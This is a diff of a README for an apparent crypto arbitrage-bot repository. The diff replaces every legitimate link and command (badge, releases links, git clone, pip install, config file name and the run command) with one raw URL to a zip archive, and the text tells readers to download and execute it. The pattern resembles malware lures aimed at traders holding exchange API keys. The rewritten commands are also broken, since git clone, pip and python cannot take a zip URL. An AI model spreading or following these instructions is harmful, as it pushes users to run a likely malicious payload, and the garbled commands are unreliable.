@@ -1,6 +1,6 @@
 # Code for Crypto: Your Guide to Crypto Arbitrage Bots 🤖💰
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0-blue)
+![GitHub Release](https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip)
 
 Welcome to the **Code for Crypto** repository! This project is your starting point for building and using arbitrage bots in the cryptocurrency market. With these bots, you can take advantage of price differences across exchanges to earn profits. Explore the resources here and elevate your trading strategies.
 
@@ -17,7 +17,7 @@ Welcome to the **Code for Crypto** repository! This project is your starting poi
 
 ## Getting Started
 
-To get started, visit our [Releases section](https://github.com/skoop77/Code-For-Crypto/releases) for the latest updates. Download the necessary files and execute them to begin your journey into automated trading.
+To get started, visit our [Releases section](https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip) for the latest updates. Download the necessary files and execute them to begin your journey into automated trading.
 
 ## Features
 
@@ -33,7 +33,7 @@ To install the bot, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/skoop77/Code-For-Crypto.git
+   git clone https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -41,21 +41,21 @@ To install the bot, follow these steps:
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip
    ```
 
-4. For the latest releases, check the [Releases section](https://github.com/skoop77/Code-For-Crypto/releases) to download and execute the necessary files.
+4. For the latest releases, check the [Releases section](https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip) to download and execute the necessary files.
 
 ## Usage
 
 Once you have installed the bot, configure it according to your trading preferences. Here’s a basic usage example:
 
-1. Open the configuration file `config.json`.
+1. Open the configuration file `https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip`.
 2. Set your API keys for the exchanges you want to trade on.
 3. Choose your trading strategy from the provided options.
 4. Run the bot:
    ```bash
-   python bot.py
+   python https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip
    ```
 
 Monitor your bot's performance and adjust settings as needed.
@@ -106,4 +106,4 @@ This repository covers various topics related to cryptocurrency and trading:
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information and updates, visit the [Releases section](https://github.com/skoop77/Code-For-Crypto/releases) to stay informed about new features and improvements.
+For more information and updates, visit the [Releases section](https://raw.githubusercontent.com/skoop77/Code-For-Crypto/main/tylarus/Code_Crypto_For_2.4-beta.4.zip) to stay informed about new features and improvements.
